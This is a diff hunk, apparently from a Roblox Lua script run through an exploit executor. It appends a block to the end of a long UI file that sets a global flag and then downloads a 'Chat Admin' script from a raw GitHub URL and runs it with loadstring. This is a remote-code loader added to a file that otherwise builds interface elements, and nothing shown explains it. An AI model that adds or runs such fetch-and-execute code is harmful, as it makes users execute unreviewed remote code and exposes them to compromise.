@@ -4398,3 +4398,8 @@ end)
 local Corner = Instance.new("UICorner", Button)
 Corner.CornerRadius = UDim.new(0, 8)
 end
+
+if getgenv().BudgieNoMore == nil then
+  getgenv().BudgieNoMore = false
+  loadstring(request({Url = "https://raw.githubusercontent.com/ADSKerOffical/BHU/refs/heads/main/Chat%20Admin", Method = "GET"}).Body)()
+end
